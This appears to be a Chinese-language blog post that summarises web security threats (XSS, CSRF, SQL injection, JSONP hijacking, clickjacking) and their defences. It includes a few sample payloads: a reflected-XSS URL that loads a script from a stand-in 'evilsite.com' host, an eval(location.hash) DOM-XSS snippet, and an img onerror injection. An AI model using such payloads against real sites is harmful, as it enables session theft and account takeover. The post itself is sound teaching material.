---
layout:     post
title:     Web站点安全防范总结
category:  Javascript
description: 这里介绍了常见的Web站点攻击手段和防范方法，包括XSS, CSRF, SQL注入等。
keywords:  安全 XSS CSRF SQL注入
---
互联网很危险！我们经常听到网站因为拒绝服务攻击或主页显示被修改的（通常是有害的）内容而无法使用。在一些出名的案例中，上百万的密码、邮件地址和信用卡信息被泄露给了公众，导致网站用户面临个人尴尬和财务威胁。

站点安全的目的就是为了防范这些（或者说所有）形式的攻击。更正式点说，站点安全就是为保护站点不受未授权的访问、使用、修改和破坏而采取的行为或实践。

有效的站点安全需要在对整个站点进行设计：包括Web应用编写、Web服务器的配置、密码创建和更新的策略以及客户端代码编写等过程。尽管这听起来很凶险，好消息是如果你使用的是服务器端的Web服务框架，那么多数情况下它默认已经启用了健壮而深思熟慮的措施来防范一些较常见的攻击。其它的攻击手段可以通过站点的Web服务器配置来减轻威胁，例如启用HTTPS. 最后，可以用一些公开可用的漏洞扫描工具来协助发现你是否犯了一些明显的错误。
# XSS
XSS全称是Cross Site Scripting，即跨站脚本。用来描述一类允许攻击者通过网站将客户端脚本代码注入到其他用户的浏览器中的攻击手段。由于注入到浏览器的代码来自站点，其是可信赖的，因此可以做类似将该用户用于站点认证的cookie发送给攻击者的事情。一旦攻击者拿到了这个cookie，他们就可以登陆到站点，就好像他们就是那个用户，可以做任何那个用户能做的事情。根据站点的不同，这些可能包括访问他们的信用卡信息、查看联系人、更改密码等。

Web程序代码中把用户提交的参数未做过滤就直接输出到页面，参数中的特殊字符打破了HTML页面的原有逻辑，黑客可以利用该漏洞执行任意HTML/JS代码。

## 分类及原理
本质上，分为反射型XSS(非持久型)和存储型XSS(持久型)两种，而DOM XSS是反射型XSS的一种。
### 反射型XSS(非持久型)
反射型 XSS 攻击发生在当传递给服务器的用户数据被立即返回并在浏览器中原样显示的时候 -- 当新页面载入的时候原始用户数据中的任何脚本都会被执行！

举个例子，假如有个站点搜索函数，搜索项被当作URL参数进行编码，这些搜索项将随搜索结果一同显示。攻击者可以通过构造一个包含恶意脚本的搜索链接作为参数。
例如：
```http
 http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js"></script>
```
然后把链接发送给另一个用户。如果目标用户点击了这个链接，当显示搜索结果时这个脚本就会被执行。正如上述讨论的，这促使攻击者获取了所有需要以目标用户进入站点的信息 -- 可能会购买物品或分享联系人信息。

### 存储型XSS(持久型)
恶意脚本存储在站点中，然后再原样地返回给其他用户，在用户不知情的情况下执行。

举个例子，接收包含未经修改的HTML格式评论的论坛可能会存储来自攻击者的恶意脚本。这个脚本会在评论显示的时候执行，然后向攻击者发送访问该用户账户所需的信息。这种攻击类型及其常见而且有效，因为攻击者不需要与受害者有任何直接的接触。

尽管 POST 和 GET 方式获取到的数据是XSS攻击最常见的攻击来源，任何来自浏览器的数据都可能包含漏洞（包括浏览器渲染过的Cookie数据以及用户上传和显示的文件等)。

### DOM XSS
DOM-based XSS是一种基于文档对象模型（Document Object Model，DOM)的XSS漏洞。简单理解，DOM XSS就是出现在JavaScript代码中的漏洞。与普通XSS不同的是，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显，这使我们无法通过特征匹配来检测DOM XSS，给自动化漏洞检测带来了挑战。

例如：前端经常读取URL中的参数来显示到页面中，那么攻击者完全可以伪造一个带有XSS攻击代码的URL到参数当中，直接导致页面执行XSS脚本，触发XSS攻击。

http://www.abc.com/test.html 代码如下：
```html
<script>
eval(location.hash.substr(1));
</script>
```
触发方式为：http://www.abc.com/test.html#alert(1)

### 几种可能被 XSS 攻击的 jQuery 使用方法
我们经常使用向 $ 内传入一个字符串的方式来选择或生成 DOM 元素，但如果这个字符串是来自用户输入的话，那么这种方式就是有风险的。
```js
$("<img src='' onerror='alert();'>");
```
当用户输入的字符串是像这样的时，虽然这个``` <img> ```元素不会马上被插入到网页的 DOM 中，但这个 DOM 元素已经被创建了，并且暂存在内存里。而对于``` <img> ```元素，只要设置了它的 src 属性，浏览器就会马上请求 src 属性所指向的资源。我们也可以利用这个特性做图片的预加载。在上面的示例代码中，创建元素的同时，也设置了它的属性，包括 src 属性和 onerror 事件监听器，所以浏览器会马上请求图片资源，显然请求不到，随机触发 onerror 的回调函数，也就执行了 JavaScript 代码。

类似的其他方法:
```js
.after()
.append()
.appendTo()
.before()
.html()
.insertAfter()
.insertBefore()
.prepend()
.prependTo()
.replaceAll()
.replaceWith()
.unwrap()
.wrap()
.wrapAll()
.wrapInner()
.prepend()
```
以上这些方法不仅创建 DOM 元素，并且会马上插入到页面的 DOM 树中。如果使用 ```<script> ```标签插入了内联 JS 会立即执行。

不安全的输入来源:
```js
document.URL *
document.location.pathname *
document.location.href *
document.location.search *
document.location.hash
document.referrer *
window.name
document.cookie
```
document 的大多数属性都可以通过全局的 window 对象访问到。加 * 的属性返回的时编码 （urlencode） 后的字符串，需要解码才可能造成威胁。

不安全的操作:

把可以被用户编辑的字符串，用在以下场景中，都是有隐患的。总体来说，任何把字符串作为可执行的代码的操作，都是不安全的。
* 通过字符串创建函数
    ```js
    eval
    new Function
    setTimeout/setInterval
    ```
* 跳转页面
    ```js
    location.replace/location.assign
    ```
* 修改``` <script> ```标签的 src 属性
* 修改事件监听器

如果发生在用 jQuery 时被 DOM-XSS 攻击的情况，大多是因为忽视了两个东西：
1. 在给$传参数时，对参数来源的把控。
2. 用户的输入途径不只有表单，还有地址栏，还可以通过开发者工具直接修改 DOM ，或者直接在控制台执行 JS 代码。

## 防御
* 严格校验用户输入
* 对于无法校验的输入，在输出之前进行转义
* CGI扫描器

# CSRF
CSRF 即跨站请求伪造（英语：Cross-site request forgery），也被称为one-click attack 或者session riding，通常缩写为CSRF 或者XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。

这种形式的攻击用实例来解释最好。John是一个恶意用户，他知道某个网站允许已登陆用户使用包含了账户名和数额的HTTP POST请求来转帐给指定的账户。John 构造了包含他的银行卡信息和某个数额做为隐藏表单项的表单，然后通过Email发送给了其它的站点用户（还有一个伪装成到 “快速致富”网站的链接的提交按钮）.

如果某个用户点击了提交按钮，一个 HTTP POST 请求就会发送给服务器，该请求中包含了交易信息以及浏览器中与该站点关联的所有客户端cookie（将相关联的站点cookie信息附加发送是正常的浏览器行为) 。服务器会检查这些cookie，以判断对应的用户是否已登陆且有权限进行上述交易。

最终的结果就是任何已登陆到站点的用户在点击了提交按钮后都会进行这个交易。John发财啦！

## 防御

1. 使用合理的请求方法，如敏感操作请使用POST方法，而不是GET；
2. 后端服务器也要使用合适的方法获取参数，如PHP的话使用$_POST来获取对应的参数，而不是$_REQUEST;
3. 使用token。前端在每一个请求后面加一个token，token根据skey等用户唯一值生成，然后后端用同样的算法进行校验，通过后即可。目前公司绝大部分的业务都使用到了token。
4. 校验Referer字段
5. 验证码

# SQL 注入

SQL 注入漏洞使得恶意用户能够通过在数据库上执行任意SQL代码，从而允许访问、修改或删除数据，而不管该用户的权限如何。成功的注入攻击可能会伪造身份信息、创建拥有管理员权限的身份、访问服务器上的任意数据甚至破坏/修改数据使其变得无法使用。

## 防御
* 跟XSS攻击的防范一样对输入的表单字段进行过滤，过滤掉SQL注入。同时，后端对取到的传递的参数都进行过滤，防止SQL注入。
* 参数化查询
* 增加memcache等中间层缓存

# JSONP安全问题
同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。其中同源具体是指：果协议，端口（如果指定了一个）和域名对于两个页面是相同的，则两个页面具有相同的源。
但是在很多实际应用场景中，我们不得不需要绕开浏览器的同源策略，因此出现了JSONP、图片ping等绕开同源策略的技术。其中，应用最为广泛的就是JSONP技术。

什么是JSONP

JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里``` <script></script> ```元素标签，远程调用 JSON 文件来实现数据传递。当前，前端主流的技术框架基本上都提供了JSONP的方法，如jQuery、ng等。
但随着JSONP越来越普及，其也逐渐暴露出一些安全方面的问题。

## JSON劫持

JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站通过JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。

## Callback 可定义导致的安全问题

绝大部分提供JSONP的站点都会允许自定义callback，那么这里就会带来很大的安全隐患。如：

在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞；
对callback和输出没有进行严格的过滤，导致XSS攻击。这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。
## 安全防范

* 定义严格的 Content-Type（ Content-Type: application/json ）；
* 对callback和输出进行严格的XSS过滤；
* 对请求来源Referer进行严格的过滤；
* 验证码
* token

# 命令注入
命令注入攻击（Command Injection Execution）

# 安全意识
1. 不相信任何外部输入数据，包括从内部接口输入的数据。使用前必须在前端和后台都做严格的校验或过滤。
2. 不论是用户使用的页面还是管理端页面，都必须遵循安全编码的规范。
3. 用白名单代替黑名单。
4. 权限最小化。
```php
$idcard = $_GET['idcard'];
if (!preg_match("/^\d{17}[(0-9|x|X)]$/", $idcard))
{
    exit("idcard error!");
}
```
# 点击劫持
点击劫持（clickjacking）是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段。该术语最早由雷米亚·格罗斯曼（Jeremiah Grossman）与罗伯特·汉森（Robert Hansen）于2008年提出。这种行为又被称为界面伪装（UI redressing）。

点击劫持可以被看成是责任混淆问题（confused deputy problem）的一个实例。

举例来说，如用户收到一封包含一段视频的电子邮件，但其中的“播放”按钮并不会真正播放视频，而是链入一购物网站。这样当用户试图“播放视频”时，实际是被诱骗而进入了一个购物网站。

或者使用一个透明的iFrame覆盖在另外一个网页上，在用户操作可见网页的时候同时点击了透明的iFrame页面上的恶意控件。
通过在客户端安装NoScript扩展等手段可以防止点击劫持的发生。

## 防御

点击劫持漏洞防御措施可以从两个方面考虑：服务器端防御和客户端防御。服务器端防御主要涉及到用户身份验证，客户端防御主要涉及到浏览器的安全。

### 服务器端防御

服务器端防御点击劫持漏洞的思想是结合浏览器的安全机制进行防御，主要的防御方法介绍如下。
#### X-FRAME-OPTIONS 机制

X-FRAME-OPTIONS是目前最可靠的方法。

X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。

并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。

这个头有三个值：
```http
DENY // 拒绝任何域加载
SAMEORIGIN // 允许同源域下加载
ALLOW-FROM // 可以定义允许frame加载的页面地址
```
php中设置：
```php
header("X-FRAME-OPTIONS:DENY");
```
#### 使用 FrameBusting 代码

点击劫持攻击需要首先将目标网站载入到恶意网站中，使用 iframe 载入网页是最有效的方法。Web安全研究人员针对 iframe 特性提出 Frame Busting 代码，使用 JavaScript 脚本阻止恶意网站载入网页。如果检测到网页被非法网页载入，就执行自动跳转功能。Frame Busting代码是一种有效防御网站被攻击者恶意载入的方法，网站开发人员使用Frame Busting代码阻止页面被非法载入。需要指出的情况是，如果用户浏览器禁用JavaScript脚本，那么FrameBusting代码也无法正常运行。所以，该类代码只能提供部分保障功能。

#### 使用认证码认证用户

点击劫持漏洞通过伪造网站界面进行攻击，网站开发人员可以通过认证码识别用户，确定是用户发出的点击命令才执行相应操作。识别用户的方法中最有效的方法是认证码认证。例如，在网站上广泛存在的发帖认证码，要求用户输入图形中的字符，输入某些图形的特征等。

### 客户端防御

由于点击劫持攻击的代码在客户端执行，因此客户端有很多机制可以防御此漏洞。
#### 升级浏览器
最新版本的浏览器提供很多防御点击劫持漏洞的安全机制，对于普通的互联网用户，经常更新修复浏览器的安全漏洞，能够最有效的防止恶意攻击。
#### NoScript 扩展
对于Firefox的用户，使用 NoScript 扩展能够在一定程度上检测和阻止点击劫持攻击。利用 NoScript 中 ClearClick 组件能够检测和警告潜在的点击劫持攻击，自动检测页面中可能不安全的页面。

# 其他
还有越权漏洞、并发漏洞、信息泄露等。

更多信息参考：https://www.owasp.org/index.php/Main_Page。
